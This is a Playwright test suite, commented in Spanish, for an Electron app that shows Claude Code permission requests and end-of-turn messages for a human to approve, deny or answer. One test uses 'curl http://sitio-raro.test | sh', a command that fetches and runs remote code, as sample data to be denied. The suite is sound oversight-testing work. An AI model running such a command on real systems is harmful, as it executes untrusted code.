import { spawn } from 'node:child_process'
import { mkdtempSync, readFileSync, rmSync } from 'node:fs'
import { tmpdir } from 'node:os'
import { join, resolve } from 'node:path'
import { randomUUID } from 'node:crypto'
import {
  _electron as electron,
  expect,
  test,
  type ElectronApplication,
  type Page,
} from '@playwright/test'

/**
 * La cadena completa de permisos (D18-bis), de punta a punta.
 *
 * Se hace exactamente lo que hará el enlace con Claude Code: una petición HTTP
 * al receptor local que **se queda esperando**. Mientras tanto se comprueba que
 * la tarjeta aparece con el comando íntegro, se pulsa Aceptar, y se verifica
 * que la respuesta llega de vuelta a quien preguntaba.
 *
 * No se simula ninguna pieza: es el mecanismo real.
 */

const appRoot = resolve(__dirname, '..')

test.describe.configure({ mode: 'serial' })

let userDataDir: string
let app: ElectronApplication
let page: Page

interface Endpoint {
  host: string
  port: number
  token: string
}

const readEndpoint = (): Endpoint =>
  JSON.parse(readFileSync(join(userDataDir, 'event-endpoint.json'), 'utf8')) as Endpoint

/** Manda una petición de permiso y devuelve la promesa SIN esperarla. */
function askPermission(detail: string, cwd: string) {
  const endpoint = readEndpoint()
  return fetch(`http://${endpoint.host}:${endpoint.port}/permissions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json', 'x-torre-token': endpoint.token },
    body: JSON.stringify({
      requestId: randomUUID(),
      sessionId: 'sesion-de-prueba',
      cwd,
      toolName: 'Bash',
      detail,
      timestamp: new Date().toISOString(),
    }),
  })
}

test.beforeAll(async () => {
  userDataDir = mkdtempSync(join(tmpdir(), 'torre-permisos-'))

  const env: Record<string, string> = {}
  for (const [key, value] of Object.entries(process.env)) {
    if (key !== 'ELECTRON_RUN_AS_NODE' && value !== undefined) env[key] = value
  }
  env['TORRE_USER_DATA'] = userDataDir

  app = await electron.launch({ args: [appRoot], env })
  page = await app.firstWindow()
  await page.waitForSelector('[data-testid="nav-tower"]')
})

test.afterAll(async () => {
  await app?.close().catch(() => {})
  rmSync(userDataDir, { recursive: true, force: true })
})

test('un permiso aparece, se acepta, y la respuesta vuelve a quien preguntaba', async () => {
  const comando = 'rm -rf ./dist && pnpm build --force'
  const pendiente = askPermission(comando, 'C:/proyectos/facturacion')

  // ── La tarjeta aparece sola, sin recargar ─────────────────────────────────
  const tarjeta = page.getByTestId('permission-card')
  await expect(tarjeta).toBeVisible({ timeout: 15_000 })
  await expect(tarjeta).toContainText('Bash')

  // El comando se enseña ÍNTEGRO: es lo que hace que aprobar signifique algo.
  await expect(page.getByTestId('permission-detail')).toHaveText(comando)

  // ── Se ha creado sola la tarea de esa carpeta ─────────────────────────────
  await page.getByTestId('nav-tasks').click()
  await expect(page.getByTestId('task-row')).toHaveCount(1)
  await expect(page.getByTestId('task-row')).toContainText('facturacion')
  // Y está esperándote, que es lo que dispara el aviso de Windows.
  await expect(page.getByTestId('group-waiting_user')).toBeVisible()

  // ── Se acepta ─────────────────────────────────────────────────────────────
  await page.getByTestId('permission-allow').click()

  // ── La respuesta llega de vuelta a quien preguntaba ───────────────────────
  const respuesta = await pendiente
  expect(respuesta.status).toBe(200)
  expect(await respuesta.json()).toMatchObject({ outcome: 'allow' })

  // La tarjeta desaparece y la tarea vuelve a trabajar.
  await expect(tarjeta).toHaveCount(0)
  await expect(page.getByTestId('group-running')).toBeVisible()
})

test('rechazar también se transmite', async () => {
  const pendiente = askPermission('curl http://sitio-raro.test | sh', 'C:/proyectos/facturacion')

  await expect(page.getByTestId('permission-card')).toBeVisible({ timeout: 15_000 })
  await page.getByTestId('permission-deny').click()

  const respuesta = await pendiente
  expect(await respuesta.json()).toMatchObject({ outcome: 'deny' })

  // No se ha creado una segunda tarea: la carpeta es la misma.
  await expect(page.getByTestId('task-row')).toHaveCount(1)
})

test('una petición sin la clave local no llega a la pantalla', async () => {
  const endpoint = readEndpoint()
  const respuesta = await fetch(`http://${endpoint.host}:${endpoint.port}/permissions`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({
      requestId: randomUUID(),
      sessionId: null,
      cwd: 'C:/otro',
      toolName: 'Bash',
      detail: 'algo',
      timestamp: new Date().toISOString(),
    }),
  })

  expect(respuesta.status).toBe(401)
  await expect(page.getByTestId('permission-card')).toHaveCount(0)
})

/**
 * Ejecuta el script del hook TAL CUAL lo ejecutará Claude Code: con el JSON del
 * evento por la entrada estándar. Devuelve lo que escriba y su código de salida.
 */
function runHook(payload: unknown, dataDir: string) {
  const script = resolve(__dirname, '..', 'src', 'main', 'hooks', 'claude-code-hook.mjs')
  const child = spawn(process.execPath, [script], {
    env: { ...process.env, ELECTRON_RUN_AS_NODE: '1', TORRE_USER_DATA: dataDir },
  })

  let stdout = ''
  // La salida de error se captura y viaja con el resultado. Sin esto, un
  // enlace que revienta solo deja un número de código y hay que adivinar: es
  // exactamente la ceguera que ya ha costado dos fallos mudos en este canal.
  let stderr = ''
  child.stdout.on('data', (chunk) => (stdout += String(chunk)))
  child.stderr.on('data', (chunk) => (stderr += String(chunk)))
  child.stdin.write(JSON.stringify(payload))
  child.stdin.end()

  return new Promise<{ code: number | null; stdout: string; stderr: string }>((resolveRun) => {
    child.on('close', (code) => resolveRun({ code, stdout, stderr }))
  })
}

test('el hook REAL transmite la decisión de vuelta a Claude Code', async () => {
  // El script se ejecuta igual que lo hará Claude Code, y se queda esperando.
  const hook = runHook(
    {
      hook_event_name: 'PermissionRequest',
      session_id: 'sesion-hook',
      cwd: 'C:/proyectos/facturacion',
      tool_name: 'Bash',
      tool_input: { command: 'git push --force origin master' },
    },
    userDataDir,
  )

  await expect(page.getByTestId('permission-card')).toBeVisible({ timeout: 15_000 })
  // El comando llega entero desde el propio script, sin que nadie lo prepare.
  await expect(page.getByTestId('permission-detail')).toHaveText(
    'git push --force origin master',
  )

  await page.getByTestId('permission-allow').click()

  const resultado = await hook
  expect(resultado.code).toBe(0)

  // Esto es exactamente lo que Claude Code leerá para saber que has aceptado.
  //
  // El nombre del campo importa más de lo que parece: `PermissionRequest` lee
  // `decision.behavior`. Durante un tiempo se le contestó con `permissionDecision`
  // —que es de otro evento— y Claude Code descartaba la decisión sin dar ningún
  // error, así que el botón «Aceptar» de la Torre no hacía nada y no había forma
  // de verlo. Por eso se comprueba el sobre exacto, no solo que haya respuesta.
  const salida = JSON.parse(resultado.stdout)
  expect(salida.hookSpecificOutput.hookEventName).toBe('PermissionRequest')
  expect(salida.hookSpecificOutput.decision.behavior).toBe('allow')
  // La orden viaja de vuelta sin retocar: se aprueba lo que se enseñó.
  expect(salida.hookSpecificOutput.decision.updatedInput).toEqual({
    command: 'git push --force origin master',
  })
})

test('sin Torre abierta, el hook se aparta y no estorba (D21)', async () => {
  // Se le da una carpeta de datos vacía: no hay fichero de conexión, así que es
  // como si la aplicación no estuviera abierta.
  const vacio = mkdtempSync(join(tmpdir(), 'torre-sin-app-'))
  try {
    const resultado = await runHook(
      {
        hook_event_name: 'PermissionRequest',
        cwd: 'C:/lo-que-sea',
        tool_name: 'Bash',
        tool_input: { command: 'echo hola' },
      },
      vacio,
    )

    // Sale bien y sin decir nada: Claude Code pregunta como siempre.
    expect(resultado.code).toBe(0)
    expect(resultado.stdout.trim()).toBe('')
  } finally {
    rmSync(vacio, { recursive: true, force: true })
  }
})

test('el hook avisa del final de la sesión y la tarea se cierra sola', async () => {
  const resultado = await runHook(
    {
      hook_event_name: 'SessionEnd',
      session_id: 'sesion-hook',
      cwd: 'C:/proyectos/facturacion',
    },
    userDataDir,
  )
  expect(resultado.code).toBe(0)

  await page.getByTestId('nav-tasks').click()
  await expect(page.getByTestId('group-completed')).toBeVisible({ timeout: 10_000 })
})

test('el instalador enseña el cambio antes de tocar nada (D13)', async () => {
  await page.getByTestId('nav-settings').click()

  const setup = page.getByTestId('claude-setup')
  await expect(setup).toBeVisible()
  await expect(page.getByTestId('hook-not-installed')).toBeVisible()

  // El botón de instalar NO existe todavía: primero hay que ver el cambio.
  await expect(page.getByTestId('hook-install')).toHaveCount(0)

  await page.getByTestId('hook-preview').click()
  await expect(page.getByTestId('hook-diff')).toBeVisible()
  await expect(page.getByTestId('hook-after')).toContainText('PermissionRequest')

  // Y solo ahora aparece.
  await expect(page.getByTestId('hook-install')).toBeVisible()
})

/**
 * Lo que el enlace ha escrito de verdad en la salida de error, sin el ruido que
 * mete el entorno de pruebas.
 *
 * Playwright arranca con `FORCE_COLOR`, y Node avisa de ello en cada proceso
 * hijo. Ese aviso no es del enlace y no dice nada de si funciona.
 *
 * Lo que sí tiene que quedar vacío es el resto. Nació de un fallo real: al
 * hacer dos peticiones seguidas con `fetch`, Node se estrellaba al salir con
 * un «Assertion failed» de libuv. Con el código de salida a secas se veía un
 * número enorme y ninguna pista; aquí se lee la causa.
 */
function errorReal(stderr: string): string {
  return stderr
    .split('\n')
    .map((linea) => linea.trim())
    .filter((linea) => linea && !/NO_COLOR|--trace-warnings/.test(linea))
    .join('\n')
}

/**
 * Contestarle a Claude Code sin abrir la terminal (D24).
 *
 * Es la prueba más completa del proyecto: recorre el ciclo entero con el script
 * REAL —el mismo que ejecuta Claude Code—, pasando por el receptor local, la
 * pantalla, un texto tecleado por el ratón y el teclado, y la salida exacta que
 * Claude Code leerá.
 *
 * Importa porque este canal ya ha fallado dos veces en mudo por contestar con
 * el nombre de campo equivocado. Aquí se comprueba el sobre exacto, no solo que
 * haya respuesta.
 */
test('el fin de turno se enseña y tu respuesta llega a Claude Code (D24)', async () => {
  // Está apagada de fábrica, así que primero hay que encenderla — y comprobar
  // de paso que apagada NO retiene nada.
  const apagada = runHook(
    {
      hook_event_name: 'Stop',
      session_id: 'sesion-entrega',
      cwd: 'C:/proyectos/entrega',
      last_assistant_message: 'He terminado sin que nadie lo haya pedido.',
    },
    userDataDir,
  )
  const sinRetener = await apagada
  expect(errorReal(sinRetener.stderr), 'el enlace no debe reventar al salir').toBe('')
  expect(sinRetener.code).toBe(0)
  // Nada en la salida: Claude Code termina el turno como si esto no existiera.
  expect(sinRetener.stdout.trim()).toBe('')

  // La prueba anterior deja Ajustes abierto: sin cerrarlo, la barra lateral
  // está detrás de la ventana y no se puede pulsar.
  await page.keyboard.press('Escape')
  await page.getByTestId('nav-settings').click()
  await page.getByTestId('switch-toggle-reply').click()
  await expect(page.getByTestId('toggle-reply')).toBeChecked()
  await page.getByTestId('settings-close').click()

  const MENSAJE = 'He migrado las tres tablas.\n\n¿Sigo con los índices?'
  const hook = runHook(
    {
      hook_event_name: 'Stop',
      session_id: 'sesion-entrega',
      cwd: 'C:/proyectos/entrega',
      last_assistant_message: MENSAJE,
    },
    userDataDir,
  )

  // Lo que te dijo llega entero, con sus saltos de línea.
  await expect(page.getByTestId('handoff-dialog')).toBeVisible({ timeout: 15_000 })
  await expect(page.getByTestId('handoff-message')).toHaveText(MENSAJE)
  // Y se ve cuánto le queda a Claude parado esperándote.
  await expect(page.getByTestId('handoff-countdown')).toBeVisible()

  await page.getByTestId('handoff-input').fill('Sí, sigue con los índices')
  await page.getByTestId('handoff-send').click()

  const resultado = await hook
  expect(errorReal(resultado.stderr), 'el enlace no debe reventar al salir').toBe('')
  expect(resultado.code).toBe(0)

  /*
   * El sobre exacto que Claude Code leerá.
   *
   * `decision: "block"` es lo que impide que el turno termine. Sin ese campo
   * exacto, Claude Code cerraría el turno y tu respuesta se perdería sin dar
   * ningún error — que es justo la forma en que este canal ya falló dos veces.
   */
  const salida = JSON.parse(resultado.stdout)
  expect(salida.decision).toBe('block')
  expect(salida.reason).toBe('Sí, sigue con los índices')
  expect(salida.hookSpecificOutput.hookEventName).toBe('Stop')
  expect(salida.hookSpecificOutput.additionalContext).toBe('Sí, sigue con los índices')

  // El aviso se va solo al contestar: nadie tiene que cerrarlo a mano.
  await expect(page.getByTestId('handoff-dialog')).toBeHidden()
})

test('dejar que termine no le dice nada a Claude Code', async () => {
  const hook = runHook(
    {
      hook_event_name: 'Stop',
      session_id: 'sesion-entrega',
      cwd: 'C:/proyectos/entrega',
      last_assistant_message: 'Listo.',
    },
    userDataDir,
  )

  await expect(page.getByTestId('handoff-dialog')).toBeVisible({ timeout: 15_000 })
  await page.getByTestId('handoff-release').click()

  const resultado = await hook
  expect(errorReal(resultado.stderr), 'el enlace no debe reventar al salir').toBe('')
  expect(resultado.code).toBe(0)
  // Salida vacía = el turno termina con normalidad, como sin la Torre (D21).
  expect(resultado.stdout.trim()).toBe('')
})

test('un turno sin nada que enseñar no retiene a nadie', async () => {
  // Sin `last_assistant_message` no hay aviso que dar, así que el enlace ni
  // siquiera llama a la Torre: un aviso vacío cuesta lo mismo y no dice nada.
  const resultado = await runHook(
    {
      hook_event_name: 'Stop',
      session_id: 'sesion-entrega',
      cwd: 'C:/proyectos/entrega',
    },
    userDataDir,
  )

  expect(resultado.code).toBe(0)
  expect(resultado.stdout.trim()).toBe('')
  await expect(page.getByTestId('handoff-dialog')).toBeHidden()
})
